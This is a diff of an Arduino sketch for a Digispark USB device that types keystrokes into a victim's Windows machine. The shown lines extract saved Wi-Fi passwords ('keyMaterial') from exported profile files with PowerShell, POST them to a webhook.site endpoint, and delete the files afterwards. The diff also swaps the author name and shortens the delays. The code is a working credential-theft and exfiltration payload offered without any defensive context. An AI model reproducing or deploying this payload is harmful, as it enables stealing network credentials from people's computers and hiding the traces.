@@ -1,4 +1,4 @@
-// Author - DARK_BLACK
+// Author - bittu sharma
 
 
 
@@ -36,7 +36,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); 
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<enter url> -Method POST -InFile Wi-Fi-PASS"); 
+  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/   -Method POST -InFile Wi-Fi-PASS"); 
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("del Wi-* /s /f /q"); 
   DigiKeyboard.delay(100);
@@ -44,8 +44,8 @@ void loop() {
   DigiKeyboard.delay(100);
   
   digitalWrite(1, HIGH); 
-  DigiKeyboard.delay(90000);
+  DigiKeyboard.delay(9000);
   digitalWrite(1, LOW); 
-  DigiKeyboard.delay(5000);
+  DigiKeyboard.delay(500);
   
 }
